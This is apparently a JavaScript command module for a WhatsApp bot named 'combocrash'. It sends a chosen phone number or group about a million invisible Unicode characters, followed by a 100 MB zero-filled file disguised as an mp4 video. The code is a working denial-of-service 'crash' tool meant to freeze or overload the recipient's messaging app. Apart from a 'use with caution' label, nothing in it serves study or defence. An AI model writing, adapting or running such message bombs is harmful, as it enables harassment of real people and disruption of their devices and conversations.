import fs from "fs";
import path from "path";

export default {
  name: "combocrash",
  description: "Send invisible text + media bomb to a number/group. Use with caution!",
  async execute(msg, { sock, args }) {
    try {
      if (!args[0]) {
        return await sock.sendMessage(msg.key.remoteJid, {
          text: "⚠️ Usage: #combocrash <number/group-id>"
        });
      }

      // --- Generate invisible payload ---
      const invisibleChars = [
        "\u200B", // ZWSP
        "\u200C", // ZWNJ
        "\u200D", // ZWJ
        "\u200E", // LRM
        "\u200F"  // RLM
      ];
      const invisiblePayload = invisibleChars.join("").repeat(200000); // 1M chars-ish

      // --- Generate media bomb ---
      const filePath = path.join(process.cwd(), "combo_bomb.mp4");
      const sizeInMB = 100; // caution: large, but not too huge
      const buffer = Buffer.alloc(sizeInMB * 1024 * 1024, 0); // zeros
      fs.writeFileSync(filePath, buffer);

      // --- Format target ---
      let target = args[0];
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return await sock.sendMessage(msg.key.remoteJid, {
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX"
          });
        }
        target = target + "@s.whatsapp.net";
      }

      // --- Send invisible text first ---
      await sock.sendMessage(target, { text: invisiblePayload });

      // --- Send media bomb after a short delay ---
      await new Promise(r => setTimeout(r, 2000)); // 2 seconds delay
      await sock.sendMessage(target, {
        video: fs.readFileSync(filePath),
        caption: "💣 Combo Crash 💣"
      });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `✅ Combo crash sent to ${args[0]}! Be cautious while using it.`
      });

      // --- Cleanup ---
      fs.unlinkSync(filePath);

    } catch (e) {
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send combo crash: " + e.message
      });
    }
  }
};
